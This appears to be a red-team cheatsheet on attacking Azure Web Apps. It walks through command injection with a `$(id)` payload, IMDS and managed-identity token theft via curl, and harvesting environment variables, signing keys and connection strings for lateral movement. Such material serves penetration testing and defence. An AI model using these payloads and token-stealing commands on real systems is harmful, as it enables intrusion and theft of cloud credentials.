# Azure Web Apps
This folder is used to track resources, scripts, and cheatsheets related to Azure Web Apps (App Services).

---

## Fingerprinting an Azure Web App

Use `curl -I` to fetch HTTP response headers and identify Azure-hosted web apps:

```bash
curl -I "https://<app-name>.azurewebsites.net/"
```

**Key indicators:**
- Domain ends in `.azurewebsites.net`
- `Server` header reveals the web server (e.g., `nginx/1.26.2`)
- `X-Powered-By` header leaks the runtime and version (e.g., `PHP/8.2.27`)

![Fingerprinting an Azure Web App](./images/fingerprint-azure-webapp.png)

## Web App Remote Code Execution

OS command injection occurs when user-supplied input is passed unsanitized into system commands. Azure Web Apps running PHP (or other server-side languages) that use functions like `exec()`, `system()`, or `shell_exec()` with user input are vulnerable.

### How It Works

1. The application accepts a user-controlled parameter (e.g., `serialNumber`)
2. The value is concatenated directly into a shell command without sanitization
3. An attacker injects a shell sub-expression like `$(id)` into the parameter
4. The server-side code passes the payload to `exec()`, which the shell interprets and executes

**Example payload:**

```
serialNumber=123$(id)
```

**Server-side PHP (vulnerable):**

```php
$command = "check_serial_number.sh 123$(id)";
exec($command);
// Shell interprets $(id) → executes `id` command → Remote Code Execution
```

![Web App Remote Code Execution](./images/RemoteCodeExec.png)

### Exploitation Tips

- **Identify injectable parameters** — look for input fields that interact with server-side scripts or system utilities
- **Test with simple commands** — start with `$(id)`, `$(whoami)`, or `$(hostname)` to confirm execution
- **Escalate** — once RCE is confirmed, pivot to reading environment variables (`$(env)`), accessing managed identity tokens, or establishing a reverse shell
- **Azure-specific targeting** — on Azure Web Apps, use RCE to query the Instance Metadata Service (IMDS) for managed identity tokens:

```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Common Vulnerable Functions by Language

| Language | Dangerous Functions |
|---|---|
| PHP | `exec()`, `system()`, `shell_exec()`, `passthru()`, `popen()` |
| Python | `os.system()`, `subprocess.call()`, `subprocess.Popen()` |
| Node.js | `child_process.exec()`, `child_process.spawn()` |
| .NET | `Process.Start()`, `System.Diagnostics.Process` |

---

## Useful Environment Variables to Find

After gaining code execution on an Azure Web App, dump environment variables to extract valuable information for lateral movement and privilege escalation.

```bash
# Dump all environment variables
env
# Or on Windows
set
```

### App Environment

| Variable | Description | Red Team Value |
|---|---|---|
| `WEBSITE_OWNER_NAME` | Contains the Azure subscription ID, resource group, and webspace | Reveals the **subscription ID** — use to target other resources in the same subscription |
| `WEBSITE_SITE_NAME` | App name | Confirms the target app identity |
| `WEBSITE_RESOURCE_GROUP` | Azure resource group containing the app | Maps the app to its resource group for further ARM enumeration |
| `REGION_NAME` | Azure region of the app | Identifies datacenter location |
| `HOME` | Path to the home directory (e.g., `D:\home`) | Browse for config files, source code, and deployment artifacts |

### Managed Identity

| Variable | Description | Red Team Value |
|---|---|---|
| `IDENTITY_ENDPOINT` | URL to the local token service for the app's managed identity | Use to **request access tokens** for any Azure resource the identity has access to |
| `IDENTITY_HEADER` | Value to include in the `X-IDENTITY-HEADER` header when requesting tokens | Required for **authenticating token requests** — mitigates SSRF but is readable from within the app |
| `MSI_ENDPOINT` | Deprecated alias for `IDENTITY_ENDPOINT` | Fallback if `IDENTITY_ENDPOINT` is not set |
| `MSI_SECRET` | Deprecated alias for `IDENTITY_HEADER` | Fallback if `IDENTITY_HEADER` is not set |

### Authentication

| Variable | Description | Red Team Value |
|---|---|---|
| `WEBSITE_AUTH_ENABLED` | Indicates if App Service authentication is enabled | Determine if auth can be bypassed at the app layer |
| `WEBSITE_AUTH_ENCRYPTION_KEY` | Key used to encrypt auth tokens | Can be used to **forge or decrypt authentication tokens** across apps sharing the same key |
| `WEBSITE_AUTH_SIGNING_KEY` | Key used to sign auth tokens | Can be used to **forge signed tokens** if extracted |

### Connection Strings & Secrets

Look for environment variables with the following prefixes — they contain connection strings to backend services:

| Prefix | Service |
|---|---|
| `SQLCONNSTR_` | SQL Server |
| `SQLAZURECONNSTR_` | Azure SQL Database |
| `POSTGRESQLCONNSTR_` | PostgreSQL |
| `MYSQLCONNSTR_` | MySQL |
| `CUSTOMCONNSTR_` | Custom connection strings |
| `REDISCACHECONNSTR_` | Redis Cache |
| `DOCDBCONNSTR_` | Cosmos DB |
| `SERVICEBUSCONNSTR_` | Azure Service Bus |
| `EVENTHUBCONNSTR_` | Azure Event Hubs |
| `NOTIFICATIONHUBCONNSTR_` | Azure Notification Hubs |

### Stealing a Managed Identity Token via RCE

Once you have `IDENTITY_ENDPOINT` and `IDENTITY_HEADER`, request a token directly:

```bash
curl "${IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}"
```

Request a token for other resources by changing the `resource` parameter:

```bash
# Microsoft Graph
curl "${IDENTITY_ENDPOINT}?resource=https://graph.microsoft.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}"

# Key Vault
curl "${IDENTITY_ENDPOINT}?resource=https://vault.azure.net&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}"

# Azure Storage
curl "${IDENTITY_ENDPOINT}?resource=https://storage.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}"
```

---

## Microsoft Documentation References

- [App Service Environment Variables and App Settings](https://learn.microsoft.com/azure/app-service/reference-app-settings)
- [Managed Identities for App Service and Azure Functions](https://learn.microsoft.com/azure/app-service/overview-managed-identity)
- [Managed Identity REST Endpoint Reference](https://learn.microsoft.com/azure/app-service/overview-managed-identity#rest-endpoint-reference)
- [Azure Security Baseline for App Service](https://learn.microsoft.com/security/benchmark/azure/baselines/app-service-security-baseline)

